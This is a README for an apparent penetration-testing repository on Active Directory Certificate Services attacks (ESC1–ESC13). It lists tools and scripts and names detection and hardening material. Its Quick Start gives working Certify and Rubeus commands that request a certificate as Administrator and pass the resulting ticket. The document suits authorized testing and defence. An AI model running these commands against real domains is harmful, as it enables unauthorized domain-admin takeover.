# ADCS Attack Chains - Comprehensive Tooling & Exploitation Guide

## Overview

This repository contains comprehensive tooling, documentation, and automation scripts for Active Directory Certificate Services (ADCS) attack chains. These materials are designed for authorized penetration testing, red team operations, security research, and defensive blue team analysis.

## Table of Contents

1. [Attack Techniques](#attack-techniques)
2. [Tools Included](#tools-included)
3. [Attack Chain Workflows](#attack-chain-workflows)
4. [Detection & Defense](#detection--defense)
5. [Lab Setup](#lab-setup)
6. [Usage Examples](#usage-examples)

---

## Attack Techniques Covered

### ESC1 - Misconfigured Certificate Templates
- Domain authentication with arbitrary SAN
- Privilege escalation through certificate enrollment
- Persistence through certificate validity period

### ESC2 - Misconfigured Certificate Templates (Any Purpose EKU)
- Subordinate CA certificates
- Any Purpose or No EKU exploitation

### ESC3 - Enrollment Agent Templates
- Certificate Request Agent abuse
- Two-step certificate enrollment

### ESC4 - Vulnerable Certificate Template Access Control
- Template modification attacks
- ACL-based privilege escalation

### ESC5 - Vulnerable PKI Object Access Control
- CA server object modification
- Certificate template container manipulation

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
- User-specified SAN in certificate requests
- Legacy CA configuration abuse

### ESC7 - Vulnerable Certificate Authority Access Control
- ManageCA permission abuse
- Template approval/publication manipulation

### ESC8 - NTLM Relay to AD CS HTTP Endpoints
- Web enrollment NTLM relay
- Certificate-based authentication relay

### ESC9 - No Security Extension
- CT_FLAG_NO_SECURITY_EXTENSION exploitation
- StrongCertificateBindingEnforcement bypass

### ESC10 - Weak Certificate Mappings
- Certificate mapping policy abuse
- CertificateMappingMethods exploitation

### ESC13 - OID Group Link Abuse
- Issuance policy OID exploitation
- Group membership via certificate attributes

---

## Tools Included

### Enumeration
- `Certify.exe` - Certificate template enumeration and abuse
- `Certipy` - Python-based ADCS attack toolkit
- `ADCSEnum.ps1` - PowerShell enumeration script

### Exploitation
- `Rubeus.exe` - Kerberos ticket manipulation
- `PKINITtools` - Certificate-based Kerberos authentication
- Custom PowerShell attack automation

### Post-Exploitation
- Certificate persistence mechanisms
- Golden certificate attacks
- Certificate-based backdoors

---

## Attack Chain Workflows

Each attack technique is documented with:
- **Prerequisites** - Required permissions and conditions
- **Enumeration** - Discovery and reconnaissance steps
- **Exploitation** - Step-by-step attack execution
- **Post-Exploitation** - Maintaining access and lateral movement
- **Detection Indicators** - Blue team detection opportunities
- **Remediation** - Mitigation and hardening steps

---

## Repository Structure

```
adcs_files/
├── README.md                           # This file
├── docs/
│   ├── ESC1_Guide.md                  # ESC1 attack chain
│   ├── ESC2_Guide.md                  # ESC2 attack chain
│   ├── ESC3_Guide.md                  # ESC3 attack chain
│   ├── ESC4_Guide.md                  # ESC4 attack chain
│   ├── ESC5_Guide.md                  # ESC5 attack chain
│   ├── ESC6_Guide.md                  # ESC6 attack chain
│   ├── ESC7_Guide.md                  # ESC7 attack chain
│   ├── ESC8_Guide.md                  # ESC8 attack chain
│   ├── ESC9_ESC10_Guide.md           # ESC9/10 attack chains
│   ├── ESC13_Guide.md                 # ESC13 attack chain
│   ├── Detection_Playbook.md          # Detection strategies
│   └── Defense_Hardening.md           # Remediation guide
├── scripts/
│   ├── enumeration/
│   │   ├── Enumerate-ADCS.ps1        # Full ADCS enumeration
│   │   ├── Find-VulnerableTemplates.ps1
│   │   └── Test-ADCSVulnerabilities.ps1
│   ├── exploitation/
│   │   ├── Exploit-ESC1.ps1
│   │   ├── Exploit-ESC3.ps1
│   │   ├── Exploit-ESC6.ps1
│   │   ├── Exploit-ESC8.ps1
│   │   └── Request-MaliciousCert.ps1
│   ├── post-exploitation/
│   │   ├── Create-CertPersistence.ps1
│   │   └── Forge-GoldenCertificate.ps1
│   └── defense/
│       ├── Audit-CertTemplates.ps1
│       └── Harden-ADCS.ps1
├── tools/                             # Binary tools
│   ├── Certify.exe
│   ├── Rubeus.exe
│   └── cert.exe
└── lab/
    ├── Setup-VulnerableLab.ps1       # Lab environment setup
    └── Lab_Configuration_Guide.md     # Lab setup documentation
```

---

## Quick Start

### 1. Enumeration
```powershell
# Enumerate all certificate templates and vulnerabilities
.\scripts\enumeration\Enumerate-ADCS.ps1 -Verbose

# Find vulnerable templates
.\Certify.exe find /vulnerable
```

### 2. Exploitation Example (ESC1)
```powershell
# Request certificate with arbitrary SAN
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:VulnerableTemplate /altname:Administrator

# Convert to PFX
.\Certify.exe -convert -pfx <base64-cert>

# Authenticate with certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:<base64-pfx> /password:password /ptt
```

### 3. Detection
```powershell
# Audit certificate templates for misconfigurations
.\scripts\defense\Audit-CertTemplates.ps1 -OutputReport
```

---

## Legal and Ethical Use

**WARNING**: These tools and techniques are provided for:
- Authorized penetration testing engagements
- Red team operations with proper authorization
- Security research in controlled environments
- Defensive security analysis and hardening
- Capture The Flag (CTF) competitions
- Educational purposes in lab environments

**UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS ILLEGAL**. Always obtain explicit written permission before testing any systems you do not own.

---

## References

- [Certified Pre-Owned - SpecterOps Research](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [ADCS ESC9 & ESC10 - Elad Shamir](https://posts.specterops.io/adcs-esc9-esc10-abuse-techniques-f9b9c648056b)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [Certify Documentation](https://github.com/GhostPack/Certify)
- Microsoft ADCS Security Documentation

---

## Author & Contributions

Maintained for security research and authorized testing purposes.
Contributions welcome via pull requests.

## License

Educational and authorized security testing use only.
